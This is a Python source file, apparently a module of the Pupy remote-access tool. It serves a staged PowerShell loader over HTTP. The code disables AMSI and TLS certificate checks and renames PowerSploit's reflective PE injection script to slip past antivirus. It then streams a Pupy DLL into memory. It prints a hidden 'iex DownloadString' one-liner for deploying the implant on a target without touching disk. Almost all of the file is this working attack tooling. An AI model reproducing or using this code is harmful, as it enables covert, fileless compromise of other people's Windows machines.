#!/usr/bin/env python
# -*- coding: UTF8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os.path
from pupylib.utils.term import colorize
import random, string
from pupygen import get_edit_pupyx86_dll
try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from ssl import wrap_socket
from base64 import b64encode
import re

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
url_random_three = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))

def obfs_ps_script(script):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.
    """
    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
    return strippedCode

def create_ps_command(ps_command, force_ps32=False, nothidden=False):
    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
    try{{ 
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }}catch{{}}
    {}
    """.format(ps_command)

    if force_ps32:
        command = """$command = '{}'
        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
        {{
            
            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
            IEX $exec
        }}
        else
        {{
            $exec = [System.Convert]::FromBase64String($command)
            $exec = [Text.Encoding]::Unicode.GetString($exec)
            IEX $exec
        }}""".format(b64encode(ps_command.encode('UTF-16LE')))
        
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))

    elif not force_ps32:
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))

    return command

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # print self.server.random_reflectivepeinj_name
        if self.path=="/%s" % url_random_one:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()

            launcher = """
            IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');
            $WebClient = New-Object System.Net.WebClient;
            [Byte[]]$bytes = $WebClient.DownloadData('http://{server}:{port}/{url_random_three}');
            {function_invoke} -ForceASLR -PEBytes $bytes""".format(  
                                                                                server=self.server.link_ip,
                                                                                port=self.server.link_port,
                                                                                function_invoke=self.server.random_reflectivepeinj_name,
                                                                                url_random_two=url_random_two, 
                                                                                url_random_three=url_random_three
                                                                            )
            launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
            self.wfile.write(launcher)
            print colorize("[+] ","green")+" Powershell script stage1 served !"
        
        elif self.path=="/%s" % url_random_two:
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
            code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
            self.wfile.write(obfs_ps_script(code))
            print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"

        elif self.path=="/%s" % url_random_three:
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            raw = get_edit_pupyx86_dll(self.server.payload_conf)
            self.wfile.write(raw)
            print colorize("[+] ","green")+" pupy dllx86 script served !"

        else:
            self.send_response(404)
            self.end_headers()
            return

class ps1_HTTPServer(HTTPServer):
    def __init__(self, server_address, conf, link_ip, link_port, ssl):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=link_port
        self.aes_key=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,16)]) # must be 16 char long for aes 128
        self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))]) # must be 16 char long for aes 128
        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
        if ssl:
            config = configparser.ConfigParser()
            config.read("pupy.conf")
            keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
            certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
            self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False):
    try:
        while True:
            try:
                server = ps1_HTTPServer((ip, port), conf, link_ip, port, ssl)
                break
            except Exception as e:
                # [Errno 98] Adress already in use
                if e[0] == 98:
                    port+=1
                else:
                    raise
        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')\""%(link_ip, port, url_random_one), "green")
        # This line could work check when proxy is used (have to be tested)
        # oneliner=colorize("powershell.exe -w hidden -noni -nop -c $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://%s:%s/pa')"%(link_ip, port), "green")
        print oneliner
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()


